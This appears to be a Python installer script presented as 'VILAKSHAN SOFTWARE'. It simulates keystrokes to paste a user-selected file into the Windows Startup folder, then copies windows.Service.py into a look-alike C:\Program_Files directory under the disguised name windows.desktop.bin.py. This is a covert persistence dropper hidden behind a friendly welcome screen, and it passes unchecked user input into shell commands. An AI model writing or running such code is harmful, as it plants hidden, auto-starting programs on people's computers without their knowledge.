import time
import os
from pynput.keyboard import Controller,Key

keyboard=Controller()

print ('='*30,'\n\n\t\tWELCOME TO VILAKSHAN SOFTWARE\n\nNote: After pressing enter select \"windows.desktop\" \n','='*30)

source = input('Enter the drive letter of the source : ')
for i in range(3):
    time.sleep(1)
    print(i)
    
keyboard.press(Key.ctrl)
keyboard.press('c')
keyboard.release('c')
keyboard.release(Key.ctrl)
os.system('start shell:startup')
time.sleep(1)
keyboard.press(Key.ctrl)
keyboard.press('v')
keyboard.release(Key.ctrl)
keyboard.release('v')
time.sleep(1)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.press(Key.alt)
keyboard.press(Key.f4)
keyboard.release(Key.f4)
keyboard.release(Key.alt)
os.system("md C:\\Program_Files")
os.system("copy "+source+":\\windows.Service.py C:\\Program_Files\\windows.desktop.bin.py")
os.system("md C:\\Program_Files\\services")
print("Completed")
